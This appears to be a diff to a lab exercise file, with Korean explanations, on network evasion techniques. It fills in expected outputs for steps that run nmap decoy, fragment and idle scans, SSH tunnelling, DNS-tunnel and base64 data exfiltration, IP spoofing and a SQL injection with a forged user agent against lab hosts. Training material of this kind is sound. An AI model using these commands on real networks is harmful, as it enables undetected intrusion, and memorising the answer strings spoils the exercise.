@@ -25,7 +25,7 @@ steps:
     추정할 수 있다.
   verify:
     type: output_contains
-    expect: null
+    expect: filtered
     field: stdout
   target_vm: attacker
   script: nmap -sA -p 22,80,443,8080 10.20.30.1
@@ -43,7 +43,7 @@ steps:
     한다.
   verify:
     type: output_contains
-    expect: null
+    expect: open
     field: stdout
   target_vm: attacker
   script: nmap -f --mtu 24 -p 80,443,3000 10.20.30.80
@@ -61,7 +61,7 @@ steps:
     않으면 SYN flood로 오탐될 수 있다.
   verify:
     type: output_contains
-    expect: ''
+    expect: 10.20.30.80
     field: stdout
   target_vm: attacker
   script: nmap -D 10.20.30.50,10.20.30.60,ME,10.20.30.70 -p 80,3000 10.20.30.80
@@ -78,7 +78,7 @@ steps:
     포트)만 허용하는 경우, 터널을 통해 내부의 임의 서비스에 접근할 수 있다. -N은 원격 명령 실행 없이 포워딩만, -f는 백그라운드 실행이다.
   verify:
     type: output_contains
-    expect: null
+    expect: ssh -L
     field: stdout
   target_vm: attacker
   script: echo 'ssh -L 8888:10.20.30.80:3000 -N -f ccc@10.20.30.1'
@@ -96,7 +96,7 @@ steps:
     SOCKS 프록시를 통해 실행할 수 있다.
   verify:
     type: output_contains
-    expect: null
+    expect: ssh -D
     field: stdout
   target_vm: attacker
   script: echo 'ssh -D 1080 -N -f ccc@10.20.30.1 && curl --socks5 127.0.0.1:1080 http://10.20.30.80:3000'
@@ -114,7 +114,7 @@ steps:
     기반 방화벽에서는 효과가 제한적이다.
   verify:
     type: output_contains
-    expect: null
+    expect: open
     field: stdout
   target_vm: attacker
   script: nmap --source-port 53 -p 22,80,443 10.20.30.80
@@ -132,7 +132,7 @@ steps:
     페이로드 크기와 빈도를 모니터링해야 한다.
   verify:
     type: output_contains
-    expect: null
+    expect: bytes from
     field: stdout
   target_vm: attacker
   script: ping -c 3 -p 4141414141414141 -s 64 10.20.30.80
@@ -151,7 +151,7 @@ steps:
     구현한다.
   verify:
     type: output_contains
-    expect: null
+    expect: Encoded payload
     field: stdout
   target_vm: attacker
   script: 'CMD=$(echo ''whoami && hostname'' | base64) && curl -s -X POST -d "data=$CMD"
@@ -172,7 +172,7 @@ steps:
     주로 사용한다.
   verify:
     type: output_contains
-    expect: null
+    expect: Timing
     field: stdout
   target_vm: attacker
   script: for t in 0 2 4; do echo "=== Timing T$t ==="; time nmap -T$t -p 80 10.20.30.80
@@ -194,7 +194,7 @@ steps:
     Stack) 환경에서 흔한 보안 맹점이다.
   verify:
     type: output_contains
-    expect: null
+    expect: nmap
     field: stdout
   target_vm: attacker
   script: nmap --script targets-ipv6-multicast-echo --script-args newtargets -e eth0
@@ -215,7 +215,7 @@ steps:
     iodine 등의 도구가 있다.
   verify:
     type: output_contains
-    expect: null
+    expect: tunnel
     field: stdout
   target_vm: attacker
   script: 'DATA=$(hostname | base64 | tr -d ''=\n'') && echo "DNS tunnel payload:
@@ -234,7 +234,7 @@ steps:
     그 호스트의 IP로 트래픽을 전송하여 탐지를 회피할 수 있다. 이는 피봇팅과 결합하여 다단계 공격에서 추적을 어렵게 만든다.
   verify:
     type: output_contains
-    expect: null
+    expect: SNAT
     field: stdout
   target_vm: attacker
   script: echo 'iptables -t nat -A POSTROUTING -o eth0 -j SNAT --to-source 10.20.30.50'
@@ -255,7 +255,7 @@ steps:
     우회를 시도한다.
   verify:
     type: output_contains
-    expect: null
+    expect: '200'
     field: stdout
   target_vm: attacker
   script: "curl -s -A 'Mozilla/5.0 (compatible; Googlebot/2.1)' 'http://10.20.30.80:3000/rest/products/search?q=%27%20OR%201%3D1--'\
@@ -278,7 +278,7 @@ steps:
     대상에는 좀비의 IP만 기록된다.
   verify:
     type: output_contains
-    expect: null
+    expect: Idle Scan
     field: stdout
   target_vm: attacker
   script: nmap --script ipidseq 10.20.30.80 && echo '--- Idle Scan Principle ---'
@@ -307,7 +307,7 @@ steps:
     네트워크 행위 분석을 다층적으로 적용해야 한다.
   verify:
     type: output_contains
-    expect: null
+    expect: Network Evasion Techniques Report
     field: stdout
   target_vm: attacker
   script: 'echo -e ''=== Network Evasion Techniques Report ===\n\n[Packet Level]\n1.
